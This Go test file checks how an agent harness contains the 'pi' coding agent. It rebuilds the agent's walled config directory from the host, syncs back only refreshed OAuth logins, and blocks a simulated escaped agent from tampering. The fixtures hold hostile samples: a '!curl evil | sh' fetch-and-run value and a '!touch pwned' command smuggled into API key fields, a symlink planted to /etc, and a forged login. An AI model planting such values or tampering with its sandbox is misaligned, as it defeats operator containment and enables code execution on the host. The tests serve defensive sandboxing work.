package harness

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func piReadAuth(t *testing.T, path string) map[string]map[string]any {
	t.Helper()
	raw, err := os.ReadFile(path)
	require.NoError(t, err)
	var out map[string]map[string]any
	require.NoError(t, json.Unmarshal(raw, &out))
	return out
}

func piWriteAuth(t *testing.T, path, content string) {
	t.Helper()
	require.NoError(t, os.WriteFile(path, []byte(content), 0o600))
}

// The walled agent directory is rebuilt from the operator's before every
// walled launch: the credential copy mirrors the host, every config entry is
// a link back to the host (present there or not), and whatever a walled agent
// replaced or added is put back.
func TestPreparePiWalledAgentDirRebuildsFromTheHost(t *testing.T) {
	host := piTestAgentDir(t)
	require.NoError(t, os.MkdirAll(filepath.Join(host, "extensions"), 0o700))
	piWriteAuth(t, filepath.Join(host, "auth.json"), `{"openai":{"type":"api_key","key":"sk-host"}}`)
	require.NoError(t, os.WriteFile(filepath.Join(host, "settings.json"), []byte(`{}`), 0o600))
	require.NoError(t, os.WriteFile(filepath.Join(host, "custom-theme.json"), []byte(`{}`), 0o600))

	walled, err := PreparePiWalledAgentDir()
	require.NoError(t, err)
	assert.NotEqual(t, host, walled)
	assert.Equal(t, piReadAuth(t, filepath.Join(host, "auth.json")), piReadAuth(t, filepath.Join(walled, "auth.json")))
	for _, name := range []string{"settings.json", "extensions", "sessions", "custom-theme.json", "models.json", "mcp.json"} {
		target, err := os.Readlink(filepath.Join(walled, name))
		require.NoError(t, err, name)
		assert.Equal(t, filepath.Join(host, name), target, "%s links to the host, present there or not", name)
	}
	assert.DirExists(t, filepath.Join(host, "sessions"))

	// What a walled agent did to the walled directory.
	require.NoError(t, os.Remove(filepath.Join(walled, "settings.json")))
	require.NoError(t, os.WriteFile(filepath.Join(walled, "settings.json"), []byte(`{"packages":["evil"]}`), 0o600))
	require.NoError(t, os.Symlink("/etc", filepath.Join(walled, "planted")))
	piWriteAuth(t, filepath.Join(walled, "auth.json"), `{"openai":{"type":"api_key","key":"!touch pwned"}}`)
	require.NoError(t, os.WriteFile(filepath.Join(walled, "crashes.json"), []byte(`[]`), 0o600))

	_, err = PreparePiWalledAgentDir()
	require.NoError(t, err)
	target, err := os.Readlink(filepath.Join(walled, "settings.json"))
	require.NoError(t, err)
	assert.Equal(t, filepath.Join(host, "settings.json"), target)
	_, err = os.Lstat(filepath.Join(walled, "planted"))
	assert.True(t, os.IsNotExist(err), "a link the host does not have is pruned")
	assert.Equal(t, "sk-host", piReadAuth(t, filepath.Join(walled, "auth.json"))["openai"]["key"])
	assert.Equal(t, "sk-host", piReadAuth(t, filepath.Join(host, "auth.json"))["openai"]["key"],
		"an API key a walled agent wrote never reaches the host")
	assert.FileExists(t, filepath.Join(walled, "crashes.json"), "what pi writes at run time stays")
}

// Only a refreshed OAuth login travels back to the host: newer, for a
// provider the host already has an OAuth login for, never an API key.
func TestSyncPiWalledAuthCarriesOnlyRefreshedLogins(t *testing.T) {
	host := piTestAgentDir(t)
	require.NoError(t, os.MkdirAll(host, 0o700))
	piWriteAuth(t, filepath.Join(host, "auth.json"), `{
		"openai-codex": {"type":"oauth","access":"old","refresh":"r1","expires":1000,"accountId":"acct"},
		"xai": {"type":"oauth","access":"host-new","refresh":"x2","expires":9000},
		"anthropic": {"type":"api_key","key":"sk-host"}
	}`)
	walled, err := PreparePiWalledAgentDir()
	require.NoError(t, err)

	// Inside the wall: pi refreshed openai-codex; an agent planted a command
	// key, a login for a provider the host has none for, and a stale xai.
	piWriteAuth(t, filepath.Join(walled, "auth.json"), `{
		"openai-codex": {"type":"oauth","access":"new","refresh":"r2","expires":5000,"accountId":"acct"},
		"xai": {"type":"oauth","access":"walled-old","refresh":"x1","expires":100},
		"anthropic": {"type":"api_key","key":"!curl evil | sh"},
		"google": {"type":"oauth","access":"forged","refresh":"f","expires":99999}
	}`)
	require.NoError(t, SyncPiWalledAuth())

	got := piReadAuth(t, filepath.Join(host, "auth.json"))
	assert.Equal(t, "new", got["openai-codex"]["access"])
	assert.Equal(t, "r2", got["openai-codex"]["refresh"], "the rotated refresh token reaches the host")
	assert.Equal(t, "host-new", got["xai"]["access"], "an older login never replaces a newer one")
	assert.Equal(t, "sk-host", got["anthropic"]["key"])
	assert.NotContains(t, got, "google")
	raw, err := os.ReadFile(filepath.Join(host, "auth.json"))
	require.NoError(t, err)
	assert.False(t, strings.Contains(string(raw), "evil"))
	info, err := os.Stat(filepath.Join(host, "auth.json"))
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o600), info.Mode().Perm())

	// The host's newer xai login reaches the running walled copy.
	assert.Equal(t, "host-new", piReadAuth(t, filepath.Join(walled, "auth.json"))["xai"]["access"])
	assert.NoDirExists(t, filepath.Join(host, "auth.json.lock"), "pi's lock is released")
}

// A walled launch points pi at the walled agent directory last, so neither
// forwarded exports nor a pre-launch script can point it back.
func TestPiSpawnerExportsTheWalledAgentDirLast(t *testing.T) {
	cmd := piSpawner{}.BuildCommand(SpawnSpec{
		EnvExports: "export PI_CODING_AGENT_DIR=/host; ", PreLaunchScript: "PRELAUNCH; ",
		HarnessStateDir: "/walled",
	})
	assert.Greater(t, strings.LastIndex(cmd, "PI_CODING_AGENT_DIR=/walled"), strings.Index(cmd, "PRELAUNCH"))
	assert.NotContains(t, piSpawner{}.BuildCommand(SpawnSpec{}), PiAgentDirEnvVar)
}
